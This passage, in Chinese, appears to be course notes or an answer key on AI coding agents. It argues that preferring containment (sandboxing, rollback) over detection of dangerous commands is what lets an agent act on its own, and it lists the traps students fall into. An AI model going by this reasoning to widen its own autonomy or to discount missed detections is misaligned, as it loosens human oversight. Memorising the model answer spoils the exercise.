- **(d) containment > detection 翻译成「自动的许可证」（高分线收口）**：这句话表面是安全原则（防破坏靠关、不靠认），但它本质是**「敢自动」的许可证**。逻辑链是：① 你不可能认全危险命令（detection 必漏）；② 所以若你**赌 detection**，就**不敢**放手自动——一漏就是真事故；③ 但你若**赌 containment（关得住 + 救得回）**，detection 漏几条**也不致命**（关在盒子里、还能还原）；④ **正因为不致命，你才敢默认放手让 agent 自动改代码、自动跑命令。** 所以——**deepseek 不是因为「能认出危险」才敢自动，而是因为「关得住、救得回」才敢自动。** containment > detection 这句安全原则，翻过来就是一句关于自动的话：**把破坏关进盒子、把改动留下退路，是「敢让 agent 自己动手」的前提**。这正是为什么这一课虽然通篇在喂「稳」，落点却落在「自动」上——它把第 1 课「稳是孤儿」最终补成了「稳是自动得以放胆的地基」。
- **陷阱**：只把本课机制一股脑归「稳」、答不出哪个反而是「自动」的前置条件；把 containment > detection 读成纯防御原则、看不出它是「敢自动」的许可证；说不清「赌 containment 而非 detection」与「敢放手自动」之间的因果链。
